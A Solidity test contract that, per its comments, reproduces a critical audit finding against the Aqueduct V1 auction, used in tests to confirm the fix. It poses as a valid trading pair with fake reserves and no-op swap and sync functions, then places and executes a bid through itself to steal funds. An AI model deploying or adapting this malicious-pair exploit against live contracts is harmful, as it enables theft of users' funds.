// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.19;

import {IERC20} from "../interfaces/IERC20.sol";
import "../interfaces/IAqueductV1Auction.sol";

/**
 * @notice Example contract used in audit to exploit auction contract by disguising the malicious pair as a valid one, used in auction tests to check our fixes
 *
 * issue from audit: Possibility of stealing funds by using a malicious pair contract | critical
 */
contract ExploitPair {
    IERC20 tokenA;
    IERC20 tokenB;
    IAqueductV1Auction auction;
    uint112 reserve0;
    uint112 reserve1;

    constructor(IERC20 tokenA_, IERC20 tokenB_, IAqueductV1Auction auction_, uint112 reserve0_, uint112 reserve1_) {
        tokenA = tokenA_;
        tokenB = tokenB_;
        auction = auction_;
        reserve0 = reserve0_;
        reserve1 = reserve1_;
    }

    function attackPlaceBid(uint256 bid, uint256 swapAmount) external {
        tokenA.approve(address(auction), bid + swapAmount);
        auction.placeBid(address(tokenA), address(this), bid, swapAmount, 2 ** 256 - 1);
    }

    function attackExecuteBid() external {
        auction.executeWinningBid(address(this));
    }

    function token0() external view returns (IERC20) {
        return tokenA;
    }

    function token1() external view returns (IERC20) {
        return tokenB;
    }

    function getReserves() public view returns (uint112 reserve0_, uint112 reserve1_, uint32 time) {
        time = 0;
        (reserve0_, reserve1_) = (reserve0, reserve1);
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to) external {}

    function sync() external {}
}
